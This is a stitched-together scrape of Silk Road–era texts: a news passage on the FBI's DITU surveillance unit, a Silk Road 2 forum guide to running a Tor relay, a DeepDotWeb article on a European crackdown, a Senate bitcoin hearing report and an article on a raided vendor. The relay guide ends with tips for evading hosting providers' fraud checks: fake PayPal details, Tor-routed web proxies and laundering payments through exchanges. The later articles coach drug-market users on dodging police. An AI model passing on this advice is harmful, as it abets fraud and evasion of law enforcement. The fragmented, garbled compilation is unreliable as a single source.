incoming and outgoing communications. Those last two pieces of information can reveal where a computer is physically located -- perhaps along with its user -- as well as what types of applications and operating system it's running. That information could be useful for government hackers who want to install spyware on a suspect's computer -- a secret task that the DITU also helps carry out.; The DITU devised the port reader after law enforcement officials complained that they weren't getting enough information from emails and Internet traffic. The FBI has argued that under the Patriot Act, it has the authority to capture metadata and doesn't need a warrant to get them. Some federal prosecutors have gone to court to compel port reader adoption, the industry representative said. If a company failed to comply with a court order, it could be held in contempt.The FBI's pursuit of Internet metadata bears striking similarities to the NSA's efforts to obtain the same information. After the 9/11 terrorist attacks, the agency began collecting the information under a secret order signed by President George W. Bush. Documents that were declassified Nov. 18 by Barack Obama's administration show that the agency ran afoul of the Foreign Intelligence Surveillance Court after it discovered that the NSA was collecting more metadata than the court had allowed. The NSA abandoned the Internet metadata collection program in 2011, according to administration officials.But the FBI has been moving ahead with its own efforts, collecting more metadata than it has in the past. It's not clear how many companies have installed the port reader, but at least two firms are pushing back, arguing that because it captures an entire email, including content, the government needs a warrant to get the information. The government counters that the emails are only copied for a fraction of a second and that no content is passed along to the government, only metadata. The port reader is designed also to collect information about the size of communications packets and traffic flows, which can help analysts better understand how communications are moving on a network. It's unclear whether this data is considered metadata or content; it appears to fall within a legal gray zone, experts said.The DITU also runs a bespoke surveillance service, devising or building technology capable of intercepting information when the companies can't do it themselves. In the early days of social media, when companies like LinkedIn and Facebook were starting out, the unit worked with companies on a technical solution for capturing information about a specific target without also capturing information related to other people to whom the target was connected, such as comments on posts, shared photographs, and personal data from other people's profiles, according to a technology expert who was involved in the negotiations.The technicians and engineers who work at the DITU have to stay up to date on the latest trends and developments in technology so that the government doesn't find itself unable to tap into a new system. Many DITU employees used to work for the telecom companies that have to implement government surveillance orders, according to the industry representative. ""There are a lot of people with inside knowledge about how telecommunications work. It's probably more intellectual property than the carriers are comfortable with the FBI knowing.""The DITU has also intervened to ensure that the government maintains uninterrupted access to the latest commercial technology. According to the Guardian, the unit worked with Microsoft to ""understand"" potential obstacles to surveillance in a new feature of Outlook.com that let users create email aliases. At the time, the NSA wanted to make sure that it could circumvent Microsoft's encryption and maintain access to Outlook messages. In a statement to the Guardian, Microsoft said, ""When we upgrade or update products we aren't absolved from the need to comply with existing or future lawful demands."" It's the DITU's job to help keep companies in compliance. In other instances, the unit will go to companies that manufacture surveillance software and ask them to build in particular capabilities, the industry representative said.The DITU falls under the FBI's Operational Technology Division, home to agents, engineers, electronic technicians, computer forensics examiners, and analysts who ""support our most significant investigations and national security operations with advanced electronic surveillance, digital forensics, technical surveillance, tactical operations, and communications capabilities,"" according to the FBI's website. Among its publicly disclosed capabilities are surveillance of ""wireline, wireless, and data network communication technologies""; collection of digital evidence from computers, including audio files, video, and images; ""counter-encryption"" support to help break codes; and operation of what the FBI claims is ""the largest fixed land mobile radio system in the U.S.""The Operational Technology Division also specializes in so-called black-bag jobs to install surveillance equipment, as well as computer hacking, referred to on the website as ""covert entry/search capability,"" which is carried out under law enforcement and intelligence warrants.The tech experts at Quantico are the FBI's silent cybersleuths. ""While [the division's] work doesn't typically make the news, the fruits of its labor are evident in the busted child pornography ring, the exposed computer hacker, the prevented bombing, the averted terrorist plot, and the prosecuted corrupt official,"" according to the website.According to former law enforcement officials and technology industry experts, the DITU is among the most secretive and sophisticated outfits at Quantico. The FBI declined Foreign Policy's request for an interview about the unit. But in a written statement, an FBI spokesperson said it ""plays a key role in providing technical expertise, services, policy guidance, and support to the FBI and the intelligence community in collecting evidence and intelligence through the use of lawfully authorized electronic surveillance.""In addition to Carnivore, the DITU helped develop early FBI Internet surveillance tools with names like CoolMiner, Packeteer, and Phiple Troenix. One former law enforcement official said the DITU helped build the FBI's Magic Lantern keystroke logging system, a device that could be implanted on a computer and clandestinely record what its user typed. The system was devised to spy on criminals who had encrypted their communications. It was part of a broader surveillance program known as Cyber Knight.; In 2007, Wired reported that the FBI had built another piece of surveillance malware to track the source of a bomb threat against a Washington state high school. Called a ""computer and Internet protocol address verifier,"" it was able to collect details like IP addresses, a list of programs running on an infected computer, the operating system it was using, the last web address visited, and the logged-in user name. The malware was handled by the FBI's Cryptologic and Electronic Analysis Unit, located next door to the DITU's facilities at Quantico. Wired reported that information collected by the malware from its host was sent via the Internet to Quantico.The DITU has also deployed what the former law enforcement official described as ""beacons,"" which can be implanted in emails and, when opened on a target's computer, can record the target's IP address. The former official said the beacons were first deployed to track down kidnappers.Lately, one of the DITU's most important jobs has been to keep track of surveillance operations, particularly as part of the NSA's Prism system, to ensure that companies are producing the information that the spy agency wants and that the government has been authorized to obtain.The NSA is the most frequent requester of the DITU's services, sources said. There is a direct fiber-optic connection between Quantico and the agency's headquarters at Fort Meade, Maryland; data can be moved there instantly. From the companies' perspective, it doesn't much matter where the information ends up, so long as the government shows up with a lawful order to get it.""The fact that either the targets are coming from the NSA or the output goes to the NSA doesn't matter to us. We're being compelled. We're not going to do any more than we have to,"" said one industry representative.But having the DITU act as a conduit provides a useful public relations benefit: Technology companies can claim -- correctly -- that they do not provide any information about their customers directly to the NSA, because they give it to the DITU, which in turn passes it to the NSA.But in the government's response to the controversy that has erupted over government surveillance programs, FBI officials have been conspicuously absent. Robert Mueller, who stepped down as the FBI's director in September, testified before Congress about disclosed surveillance only twice, and that was in June, before many of the NSA documents that Snowden leaked had been revealed in the media. On Nov. 14, James Comey gave his first congressional testimony as the FBI's new director, and he was not asked about the FBI's involvement in surveillance operations that have been attributed to the NSA. Attorney General Eric Holder has made few public comments about surveillance. (His deputy has testified several times.)The former law enforcement official said Holder and Mueller should have offered testimony and explained how the FBI works with the NSA. He was concerned by reports that the NSA had not been adhering to its own minimization procedures, which the Justice Department and the FBI review and vouch for when submitting requests to the Foreign Intelligence Surveillance Court.""Where they hadn't done what was represented to the court, that's unforgivable. That's where I got sick to my stomach,"" the former law enforcement official said. ""The government's position is, we go to the court, apply the law -- it's all approved. That makes for a good story until you find out what was approved wasn't actually what was done."" "
"Silk Road 2 Forums","CrazyBart","155","2013-10-10T00:03:30","How to set up a TOR relay","Discussion/Security"," Since people expressed interest in running relays, I've written a guide that can get you set up. There are many ways to run a relay, so for the sake of simplicity, I will focus on virtual private servers running Ubuntu 12.04. Feedback is definitely welcome.  This guide includes instructions for Windows users. I will write Linux instructions in a separate post, and if someone would like to add Mac instructions, I'd greatly appreciate it.   ===Finding a Hosting Provider===  In order to run a relay, you will need a dedicated server or a virtual private server. There are two features you should look for:  1. Geographical location 2. Bandwidth  Other specs like RAM and CPU tend not to matter until the bandwidth gets really high, like on an unmetered server. Most of the time, your bandwidth limits will keep the Tor client well below your RAM and CPU limits.  There is no minimum amount that you need to spend on a server. You can lease a VPS for under $10 a month or a dedicated server for hundreds of dollars. I think every little bit helps, especially if the servers are geographically diverse. For this guide, I'm going to assume you don't want to drop hundreds of dollars on your first server, so we'll focus on setting up a small to medium sized VPS. The price range I'm thinking is $10 - $50 a month, which should give you 512 MB to 1 GB of RAM and 200 GB to 1 TB of bandwidth.  I'm not going to make specific recommendations for hosting providers, for obvious reasons, but most relays are in North America and Europe. It would be nice if we had more relays in South America, Asia and Africa. The infrastructure in Africa is the most underdeveloped, so you may want to focus on finding providers in South America and Asia. They will be more expensive than providers in North America and Europe. If you can't find providers in your price range, it's OK to run a relay in North America and Europe. As I said, every little bit helps.  Another thing to consider when searching for a VPS is that there are different virtualization technologies. These include OpenVZ, Xen, VMWare, Virtuozzo, and KVM. For this guide, I'm going to recommend running your relay in an OpenVZ container, because it is one of the most popular virtualization technologies, it is generally cheaper than the others for the same specs, your operating system will be installed for you by the hosting provider, and the OpenVZ connection limits aren't really a problem with low bandwidth relays. If you want your relay to push more than 1 TB of traffic a month, you should switch to something like Xen or KVM, or a dedicated server.  It's a good idea to read reviews of the hosting provider before ordering, but this can be tricky. There are a lot of fake web sites with shill reviews. In general, well-known forums with large communities (like webhostingtalk.com) are a better place to look for reviews than random web sites.  When you find a provider that you like, look for their Acceptable Use Policy (AUP), which will sometimes be part of their Terms of Service (TOS). Most hosting providers have links to these documents on their main page. Read through them to find out if they ban proxies. If there is no mention of Tor, ""proxies"" or ""open proxies"" almost always include Tor. Some hosting providers specifically ban Tor. Some only ban exit nodes. The latter case is OK, because we will be setting up non-exit relays. You don't want to waste time setting up a relay that will be shut down a week later because it violates your hosting provider's AUP.    ===Ordering a Server===  Once you find a hosting provider, you can create an account and order the VPS. I don't see a problem with leasing a VPS with your real identity. There are 4300 relays at the moment. You will be lost in a big crowd. However, you shouldn't mention that you set up a relay in this thread or anywhere else on the forum! You shouldn't use information (like a username) that links you to your Silk Road identity! If you really want anonymity, at the end of this guide there's a section that offers some suggestions, but keep in mind that takes a lot more work.  During the ordering process, you will be asked to choose an operating system. Select Ubuntu Server 12.04, so we can simplify things. Every VPS provider should have an OpenVZ image for that OS. If the VPS has 512 MB of RAM or less, use the 32 bit version. If it has 1 GB or more, use the 64 bit version.  A common box that you have to fill out is the ""domain name"". You don't need a domain name to order a VPS. You can fill in anything, like example.org. For the server name, put anything you want, it will become the hostname. If it asks for DNS information, just put ns1 and ns2, it doesn't matter.  Also, lease the VPS on a monthly basis for the first few months, even if there are discounts for longer terms. Your VPS may turn out to have crappy networking or frequent reboots, so you don't want to pay for a year of hosting and be forced to abandon the VPS after a month.  After ordering, you'll get an email with the IP address and login details of your VPS.    ===Configuring the Relay===  The first thing we need to do is figure out the RelayBandwidthRate based on the monthly bandwidth limit of the VPS. Keep in mind that most hosting providers count both incoming and outgoing bandwidth, so Tor relay traffic gets counted twice. A VPS that pushes 1 TB of traffic from the perspective of the hosting provider, actually pushes 500 GB of traffic from the perspective of the Tor network (it's the same data, coming and going).  Let's say your VPS is allowed 1 TB of traffic per month. That's 1,000,000 MB. So the rate (per second) that you would use in your Tor configuration is:  1,000,000 / 30 / 24 / 60 / 60 / 2 = 0.192 MB or 192 KB  This is a good place to start. In practice, most relays don't max out their bandwidth. In fact, many relays only use 30-50% of their max bandwidth rate. You can watch the bandwidth of your relay for a few weeks and increase it if you are using much less than your limit. For example, if in the first two weeks it uses 250 GB (and could have used 500 GB, because that's half of your 1 TB per month), then you can double the RelayBandwidthRate. It can take a few weeks of adjusting to find the right balance.  After you get the login information, download PuTTy from the web site:  http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe  This program lets you connect over a protocol called SSH, or Secure Shell, which creates an encrypted connection to a command prompt on the server. Run PuTTy and fill out the following information:  Host name (or IP address): <your VPS IP address> Port: 22 Connection type: SSH  Before we go any further, click on the words ""Default Settings"" under ""Saved Sessions"" and click the Save button to the right of it. That way you don't have to enter the IP address each time.  Then click Open. You'll see a prompt to accept the server's host key, click Yes. You only have do this the first time.  login as: root password: <what you were given>  Note that you can resize the window if it's too small.  The first thing you should do after logging in is change the root password, especially since it was emailed to you in plaintext. Do that with the following command:  passwd  And enter the password twice.  BTW, for all of these commands, you can copy them from this guide and paste them into PuTTy by right-clicking in the command prompt window.  Now type  nano /etc/apt/sources.list  Add this line at the end of the file:  deb http://deb.torproject.org/torproject.org precise main  Enter the following sequence to save the file and exit: ctrl+x, y, enter  Enter the following lines into the command prompt to install Tor and the relay monitor ARM:  apt-get update apt-get install deb.torproject.org-keyring apt-get update apt-get install tor tor-arm  Hit Y[enter] whenever it asks you to confirm an action. The first install command will give you a warning because you haven't imported the PGP key for that software repository yet, which is what you're doing with that command.  Now we'll edit the configuration file to turn our Tor client into a relay. First, backup the original configuration file:  cp /etc/tor/torrc /etc/tor/torrc.backup  If you screw something up, you can restore Tor to its default state with the following commands:  cp /etc/tor/torrc.backup /etc/tor/torrc service tor restart  Let's edit the configuration file:  nano /etc/tor/torrc  Find the following lines and remove the # at the beginning. Anything that follows a # is treated as a comment instead of an instruction to Tor, so we are adding these instructions.  ControlPort 9051              # This is a comment that Tor ignores, but everything before the hash is an instruction that Tor reads CookieAuthentication 1  ORPort 9001                   # Change this to ORPort 443  !!!!  Nickname ididnteditheconfig   # Change ididnteditheconfig to whatever nickname you want, no spaces, nothing drug or SR related  RelayBandwidthRate 100 KB     # Change 100 KB to whatever you calculated for your server earlier RelayBandwidthBurst 200 KB    # Make this double the value above. If you server is using too much bandwidth, make this the same as the line above  ContactInfo Random Person <nobody AT example dot com>  # Create a throwaway email address and put it here  ExitPolicy reject *:*         # This line makes your relay a non-exit  Then type: ctrl+x, y, enter  service tor reload  Congratulations, you're running a relay!  The RelayBandwidthRate and RelayBandwidthBurst are what you will probably want to adjust after a few weeks of watching your relay's bandwidth.  A note about the contact info. You don't need to enter a name. Remove the ""Random Person"" part entirely. However, you should enter a real email address. The purpose of providing an email address is if your relay is misconfigured, the Tor people can contact you and tell you about it. On the other hand, this email address will appear in your relay's descriptor, which is public, so use an alternate address from any of your main ones.  There is a program called ARM (Anonymous Relay Monitor) that lets you monitor your relay. To run it, type:  arm  You can click the left and right arrow keys to see the different panels of info. To exit arm, type: q, q  Another way to view info about your relay is to search for it on https://atlas.torproject.org  Finally, to exit the SSH session, type:  exit    ===Securing Your Server===  The following is not necessary, but it's an extremely good idea.  A better way to log in to your server is to create a regular user account, disable root logins, create an SSH key for your regular user, and disable password logins. That makes it virtually impossible for someone to break into your server (people try to hack into servers through SSH all day long).  To create a regular user account, enter this command:  adduser <username>  Change <username> to any one-word username you want.  Enter the password for that user twice, and make it different from root's password. Leave the rest of the prompts (like Full Name) blank by hitting enter through them, then hit y at the end.  You can test out your new user. Exit the SH session and launch PuTTy again. Now that you have a regular user, you can add it to the PuTTy configuration so you don't have to type it in every time.  In the configuration window that you get when PuTTy launches, go to Connection -> Data  Auto-login username: <the regular user you created>  Go back to the Session section, highlight ""Default Settings"", and click Save again. Connect to your server. You should only have to enter the password this time, and of course it will be your regular user's password.  When you login as the regular user, you can't do much outside of your home folder. You can't install or remove software. This is a security feature. You have to become root. In order to do that, type:  su  And enter root's password.  To exit being root, type exit, and to completely exit the SSH session, type exit again.  Let's make this even more secure by adding an SSH key.  Download this program and run it:  http://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe  Next to ""Generate a public/private key pair"", click Generate. This will take a few minutes. Click around randomly to create entropy and speed it up.  When it's done, it'll say ""Public key for pasting into OpenSSH authorized_keys file"". Copy the entire thing in the box. Log into your server as the regular user and type this:  mkdir .ssh nano .ssh/authorized_keys  Paste that public key in (by right-clicking once, as before). Then hit ctrl+x, y, enter.  Back in PuTTyGen, enter a key pass phrase and confirm it, then click ""Save private key"" and save it somewhere on your computer. The pass phrase protects your private key just like with PGP. At this point you can exit out of PuTTyGen.  Now launch PuTTy again, and in the configuration window, go to Connection -> SSH -> Auth.  Find the field that says Private key file for authentication, click Browse and select your private key.  Go back to Session, highlight ""Default Settings"" and Save.  Connect to your server again. This time it will ask you for the pass phrase to your private key, not the password to the regular user.  If you login successfully, great! You can disable root and password logins. Type:  su nano /etc/ssh/sshd_config  Find these lines:  PermitRootLogin yes             # Change it to no  #PasswordAuthentication yes     # Remove the # at the beginning and change it to no  Save and exit with ctrl+x, y, enter.  Restart the SSH server:  service ssh restart  Exit completely out and log back in as the regular user. You should login just fine. To test your settings, you can change PuTTy to login as root and it should deny you.  Now think about what an attacker has to do to get into your server. First he has to guess your regular username. Then he has to steal your private key or brute force one that works with your public key. That's like having a 2048 bit password! Then he has to guess root's password. Your server is very secure.    ===Server Maintenance===  You should login in to your server every once in a while and update the software. Login as the regular user, change to root (su), and issue these commands:  apt-get update apt-get dist-upgrade    ===Purchasing a Server Anonymously===  As I said before, I don't think it's necessary, but if you want to get a server anonymously, here are some ideas that may or may not work. Suggestions are definitely welcome.     The first thing you need to realize is that the vast majority of hosting providers use fraud detection services, because hackers and spammers love leasing servers anonymously or with stolen credit cards. You almost certainly can't sign up with a hosting provider from a Tor exit node. A popular fraud detection sevice called MaxMind claims to block VPNs and open proxies too:  https://www.maxmind.com/en/ipauthentication  If you really want to be anonymous, I don't think you should be using a VPN anyway, because you're trusting their word that they don't log, or that LE won't compel them to log in the future. The best way to find a ""clean"" IP address is to point Tor browser at a web proxy. There are web sites that list thousands of them, but for obvious reasons I won't list them here. You may have try many web proxies before you find one that isn't blocked.  The other issue is payment method. There are a few dozen hosting providers that accept bitcoins, which you could use by anonymizing them your normal way, but all of the ones that I know about are in North America and Europe, which doesn't help the diversity of the Tor network. Again, if you really want to be anonymous, that's fine because a relay in NA or EU is better than no relay.  Other than bitcoins, there are a few potentially anonymous payment methods with fiat currency.  1. Prepaid debit cards 2. e-currency and precious metals exchanges, like Pecunix 3. an anonymous PayPal account  MaxMind claims to block prepaid debit cards:  https://www.maxmind.com/en/ccv_overview  So I don't know if that will work.  As far as e-currency exchanges go, Liberty Reserve is gone, so I don't know what else exists other than Pecunix, but by routing money through several exchanges, you can potentially anonymize it. You'll have to find a hosting provider that takes these payment methods, or cash out to a different payment method.  Also, you might be able to register a PayPal account by pointing Tor Browser at a web proxy, and use fake info that is geographically close to that proxy, then go to Freenode #bitcoin-otc or localbitcoins.com and sell BTC for PayPal credit that gets deposited to your account, then use that to pay for the server.  All of these methods involve some work and a high chance of failure, but you're welcome to try them.","All credit goes to ASTOR, wherever he might be "

It seems the pressure from European law enforcement is only going to rise. Recently, a document published by Netherlandâs leading newspaper, Volkskrant, reveals a plan by the many European countries, and the US to crack down on the online drug trade in Europe. The Dutch Public Prosecution Service are working a plan called âIllegal Trade on Online Marketplacesâ (ITOM). The DPPS plans to work in conjunction with many police agencies across Europe, and the US. The plan has funding from the EU, and will work with European police agencies, Europol and Eurojust.The document isnât an official release, but an unofficial statement briefly covering their 3 point plan, given to one of Volkskrantâs journalist. There is much more to this plan that is not been revealed, and it wouldnât be surprising if the US are working on a similar operation.  itommodel  The Document Focuses on Three Things â Tracking, Shipping, and Bitcoin.      Tracking â They hope to cause âdiscouragement and deterrence, by the criminal courtâ. They plan to unmask the fake identities of people partaking in the deep web and bring them to âjusticeâ. This isnât shocking, but something that has not had a lot of interest or funding behind it, in the past. There is a lot of low hanging fruit, people not using PGP, or Tails. There are also, those with bad OPSEC, most notably, dealers. The pressure hasnât been there in the past, and as result, these mistakes were allowed to exist, but with international cooperation and focus on taking down the deep web, these mistakes will be revealed.     Shipping â They plan to force several countries to have custom inceptions on their borders, such as, France, Poland, Spain, Italy, and more. It is unclear if every EU country will participate in this, but one can only assume this will have a negative effect on the drug enforcement policies all over Europe in one or another. They want to crack down on shipments being sent through various European countries, and try to stop the flow of illicit goods. The FBI and ICE will probably be playing their part with trying to crack down on shipments from Europe to the US, as the US is one of Europeâs biggest customers, but this was not included in this unofficial release.     Bitcoin â The third, and perhaps most scary, is that they plan on investigating people who purchase bitcoin. Their reasoning is that there are very little legal use for the digital currency, and that the main use of the currency is buying illicit goods. They also plan to put regulations into place that would make bitcoins easier to track, and tie them to identity of their owner.  Countries And Agencies Involved  The operation is funded by the European Commission, which is executive body of the European Union and is responsible for day to day operations, proposing legislation and making decisions for the EU.  Law Enforcement Agencies Involve: Netherlands (LP,Customs, DLR, IRS and FP), Europol, Eurojust, the USA (FBI and ICE), German (BKA and Staatsanwalt abolished Hesse and Celle), Portugal (PGdR), the UK (NCA), Sweden (Bureau of Investigations).  Border Inceptions will be forced for these countries: Finland (Customs), France (Customs), Spain, Italy, Latvia, Lithuania, Poland,Austria, etc. (It is unclear what etc. refers to. It might be referring to the rest of the countries involved in this operation, or the European Union as a whole.)  Why Are The Dutch Spearheading This Investigation?  Dutch coffee shops, the legal drug trade, are losing out to their online and black market equivalent. Deep web markets, like coffee shops, focus on the foreign customers, but deep web markets are beating coffee shops. The Dutch newspaper, Volkskrant, estimates that the turnover of the largest online dutch dealers âis four to five times as large as that of the successful ârealâ coffee shops.â Unlike legal coffe shops, the online dealers donât pay any taxes on their sales. Netherlandâs tax revenue is being hurt by the better performing black market dealers.  Armor Up! Bitcoin And Tor Will Be Targeted!  Though, the focus of this operation is Europe, the US will likely be affected by this in big ways too. It is important for everyone on the deep web to tighten up on their security, as soon as possible. Use Tails, and PGP thoroughly! Non-traceable Bitcoin will be harder and harder to get in the future, so stock up now. Be aware that ISPs known you are using Tor, and that you simply using Tor (or bitcoin) will bring you under more suspicion. If you feel that you might of been compromised already, it might be best to stay away from the deep web for a while. Make you read the DeepDotWebâs guide to preventing and dealing with a compromised identity.",""

He was almost certainly offered to be put in a very nice federal prison if he would plea guilty or in a shitty federal prison if he risked going to trial and probably losing. It is really common for people facing life to plead guilty to be able to spend the rest of their lives in a nicer prison. Some of the federal prisons are really nice actually from what I have heard, as far as prisons go anyway. They have sports teams and people are free to roam around the campus whenever they want just not leave it. Sounds better than being in a cell all day. They might have also offered to give him a few dollars for commissary every month. When you are facing a life sentence or what will amount to a life sentence in any case, the plea isn't really about how much time you will serve but rather where you will serve it and what you will get while you serve it.  ","That's fucked up.

On the other hand, there are legitimate ways to conduct security research.  It does not involve mass accusations of malware without actually knowing what you are doing.  This is why programmers and security people (amateurs and professionals alike) are devoted to what they do, and why the open source community has been very good about expanding things, patching things, fixing things, and generally making things BETTER, not WORSE.

"Silk Road 2 Forums","Oxytocin","39464","2014-05-06T22:38:54","The road on mobile","Discussion/Security","I think it would be totally awesome if it were possible to use the road on our mobile phones, and because of this I researched it pretty hard. The short answer is that it's a no no.   It boils down to a couple of things:  1. The lack of openness in proprietary software used on mobile devices.  When a carrier like Samsung changes up Android to  make a custom skin like it does on their phones, we as users are not privy to the workings of that software and thus have to assume that they have not made mistakes or poor security decisions. Which they always do - #CLEARNET LINK# http://www.darkreading.com/mobile-security/samsung-galaxy-security-alert-android-backdoor-discovered/d/d-id/1127675 Even sim cards have been found to have backdoors.  2. The insecure nature of of the telecommunications network. This network was not designed with security and anonymity in mind, it was developed without the foresight for use with high end electronic devices. It is impossible to anonymise yourself on a network which needs to know your location, anyone looking would be able to discern where you have been and then correlate that with an identity. There are other factors too, such as how the phone decides to accept incoming phone calls and other communications, which have been shown to be hackable since it is customary to accept any signals without prejudice - #CLEARNET LINK# http://www.digitaltrends.com/mobile/femtocell-verizon-hack/ And this link is not even the one I was looking for - there are other ways and many more to come since it is ridiculously hard to take something that is inherently insecure (the telecommunications network) and make it secure.  Just so we are clear, because of these things NOTHING on mobile devices is secure. Not PGP, not Torbot, not anything. When an operating system is compromisable everything is compromisable. When you type your password into your phone for PGP if the operating system is compromised it could potentially read it from your keyboard, from memory etc.  I hope this knowledge helps you assess the risks of such an activity, but in my mind, anyone who buys on the road from Android is not playing safe.",""

A number of federal officials told a Senate hearing that such financial networks offered real benefits for the financial system even as they acknowledged that new forms of digital money had provided avenues for money laundering and illegal activity.   âThere are plenty of opportunities for digital currencies to operate within existing laws and regulations,â said Edward Lowery, a special agent with the Secret Service, which is tasked with protecting the integrity of the dollar.  Signs that the government would not stand in the way of bitcoinâs development, even as it has been cracking down on criminal networks that use the digital money, stoked a strong rally in the price of the crypto-currency.  By Monday evening, the value of a bitcoin unit soared past $700 on some exchanges. The total outstanding pool of bitcoin â which is created by a network of users who solve complex mathematical problems â is now worth more than $7 billion.  The Senate hearing Monday afternoon was the clearest indication yet of the governmentâs desire to grapple with the consequences of this growth, and the recognition that bitcoin and other similar networks could become more lasting and significant parts of the financial landscape.  âThe decision to bring virtual currency within the scope of our regulatory framework should be viewed by those who respect and obey the basic rule of law as a positive development for this sector,â said Jennifer Shasky Calvery, the director of the Treasury Departmentâs Financial Crimes Enforcement Network. âIt recognizes the innovation virtual currencies provide, and the benefits they might offer.â  Ms. Shasky Calvery and the other officials at the hearing did say that basic questions still had to be answered about virtual currencies, including whether they can actually be considered currencies or whether they are more properly categorized as commodities or securities. The distinction will determine which agencies regulate the networks and how they are treated under tax law.  Ms. Shasky Calvery said that the Internal Revenue Service was âactively workingâ on its own rules for bitcoin.  The hearing followed other less visible steps taken by regulators and lawmakers to bring digital money into the mainstream.  New York Stateâs top financial regulator, Benjamin M. Lawsky, said last week that he would hold a hearing to consider the creation of a BitLicense to provide more oversight for transactions. Earlier, the Federal Election Commission put out an advisory indicating that bitcoin could be legally accepted as political donations.  The general counsel of the Bitcoin Foundation, a nonprofit advocating the currency, said in his testimony on Monday that he was receiving a much more friendly response from both government and the financial industry.  âWe have recently perceived a marked improvement in the tone and tenor taken by both state officials and bank executives,â the general counsel, Patrick Murck, said.  Bitcoin has experienced a remarkable ascent since it was created in 2009 by an anonymous programmer or collective known as Satoshi Nakamoto. The money, which is not tied to any national currency, has been popular with technophiles who are skeptical of the worldâs central banks. Only a finite amount of bitcoin will ever be created â 21 million units. Users have bid up the price on Internet exchanges, betting that the currency will be more widely used in the future.  There are significant questions about the wisdom of the digital money as an investment, given that bitcoin has no intrinsic value and has proved to be vulnerable to hackers. Many money managers have recommended that unsophisticated investors stay away.  Recently, though, bitcoin has been catching fire around the world, with exchanges in China particularly active. A growing number of prominent American investors have also bought stakes, including Michael Novogratz, a principal at the private equity and hedge fund giant Fortress Investment Group, as well as the Winklevoss twins, Cameron and Tyler.  The increasingly widespread ownership of bitcoin has shifted attention away from the criminal enterprises that have used digital money, but it was a focus at the Senate hearing.  Last month, the online marketplace Silk Road, where bitcoin was the primary form of payment, was shut down and its founder arrested after authorities accused it of being used to buy and sell drugs, weapons and pornography. The chairman of the Senate committee, Thomas R. Carper, Democrat of Delaware, said that a few days after the arrest, a similar site sprang up.  It can be harder to track criminals who use bitcoin, law enforcement officials said at the hearing, because they operate across international borders and often do not use established financial institutions that report transactions.  But Mythili Raman, an assistant attorney general at the Justice Department, also said that because every bitcoin transaction was recorded on a public ledger, it was possible for investigators to trace the movement of money between accounts.  âIt is not in fact anonymous. It is not immune from investigation,â Ms. Raman said.  All the officials at the hearing said that crime had been an issue during the early days of credit cards and online payment systems like PayPal, and should not be a reason to limit innovation.  âIt is our duty as law enforcement to stay vigilant while recognizing that there are many legitimate users of those services,â Ms. Raman said.  The bitcoin supporters who testified at the hearing said bitcoin could bring major changes to the financial system by cutting out the middle men needed to move money around the world.  âI am here to testify because I believe that global digital currency represents one of the most important technical and economic innovations of our time,â said Jeremy Allaire, the chief executive of Circle Internet Financial, which is seeking to promote more widespread use of the currency.  Given bitcoinâs appeal to skeptics of government, many aficionados have been wary of involvement by Washington. But advocates at the hearing said that the increasing cooperation with regulators could lay the groundwork for further growth.  âAs this technology moves from early adopters into mainstream acceptance, it is critical in my view that federal and state governments establish policies surrounding digital currency,â Mr. Allaire said.",""

Screenshot of PlutoPetes vendor page where heat seal foil is one of his most popular listingsScreenshot of PlutoPetes vendor page where heat seal foil is one of his most popular listingsBefore long Pete found himself a new computer and notified the Silk Road community that he was OK but his house had been raided by the newly established British National Crime Organisation, dubbed âBritainâs FBIâ who had a warrant dated September 16th but presumably waited for the feds to make the first move on Ulbricht, They smashed through his door in the early hours of the morning and conducted a search of his home seizing many legal products commonly sold in head shops along with cash, computers and electronic storage devices (including his sons Nintendo DSi) Pete goes on to say when police came he was using processing orders on Silk Road at the time unaware of the events about to unfold in the United States but at the station police kept asking what business he did with Ross Ulbricht, Bitcoin and were persistent in repeatedly asking for his computer passwords which he declined.Pete was later released on Bail as ironically enough he never sold anything illegal on Silk Road and we had a brief exchange through the forums where Pete explained,QuoteI havenât been charged with anything yet, Iâve been bailed until February 2014 and i have to report weekly to the police station until then.My solicitor is confidant Iâve broken no UK laws in selling my products, but they did find a small amount of class A and class B drugs that were for my own personal use so i will be charged with that at the very least. SOCA returned the cash that they seized in the raid so they obviously knew they couldnât prove it was illegal earnings or they would have kept it.However to me the real story here is why British special police chose to raid a vendor who sells the same products youâd find in a high street head shop? My opinion and that of other reddit users is that they were looking for a client list since since Pete says himself ââPlanetPluto is a registered business selling legal productsâ, Such a list could would have the potential to unmask hundreds of vendors since even though all the products he sold were legal one of his biggest sellers were Moisture Barrier Bags which are typically used to store food for extended periods due to their incredibly low vapor permeability however they were also touted by Silk Road administrators in a thread read over 50â000 times as the best means to âactually BEAT canine detectionâ. In that same thread and the screenshot below we can see PlutoPete was was listed as one of only two vendors who sold these bags and from an archived backup of the site taken in March of this year itâs also clear he did a LOT of sales since at that point in time he was listed as being âRanked in the top 7% of sellersâ The products Pete sold were recommended to other vendors by Silk Road moderatorsThe products Pete sold were recommended to other vendors by Silk Road moderators (Click to enlarge)So, do vendors have anything to worry about? Well that all depends on what Police recover from PlutoPeteâs computer since he didnât indicate to me if he saved his PGP private key locally or what sort of security measures such as full disk encryption he had employed only that he was logged in to Silk Road when police arrested him so itâs safe to assume police have full access to the hard drive of computer he used. While Pete did everything by the silk road rulebook in that he didnât store any records or addresses, his computer seizure could potentially reveal the identity of every silk road vendor who didnât utilize PGP encryption when placing an order with Pete and even if they did encrypt addresses info there is always a good chance they can be recovered if police either find his PGP private key saved locally or check his PGP decryption password against every other password saved in his non TOR browser history.foil reviews imageWith or without cracking his PGP password forensic data analysis may still reveal vendor addresses since most vendors decrypt addresses then print them onto labels or packaging using commercial software which can leave evidence behind on a hard drive. PGP encryption by itself is still considered uncrackable but in writing this article I found a flaw in my own PGP setup that had I been in the same situation as PlutoPete, I could unknowingly have given up my PGP password since my decryption key was the same as a password saved in my web browser for another site, Of course instantly pulling the power combined with full disk encryption would solve that issue but Iâm now left with the feeling this could be exactly the type of weak point law enforcement try to pursue in future since PGP encryption is impossible to crack but humans have a bad habit of either reusing, forgetting or even saving passwords on a computer.Even without the PGP password law enforcement could still be in for a future windfall of vendor username/address combinations as the NSA constantly beefs up their encryption cracking technologyâs, Meanwhile (naively in my view) vendors are opening storefronts on other sites using the same usernames, presumably to carry forward reputation and posting on non TOR focal points such as the new SheepMarketplace subreddit to link up with old customers. The other vendor who was recommended in the same thread (Quality4All) has not returned my message nor logged into their forum account since July 23, 2013 so their fate is unclear but considering the threats being made by newly established NCA who claim more British suspects linked to Silk Road are expected to be detained in coming weeks it might be good advice to clean house if you had dealings past dealings with plutopete or 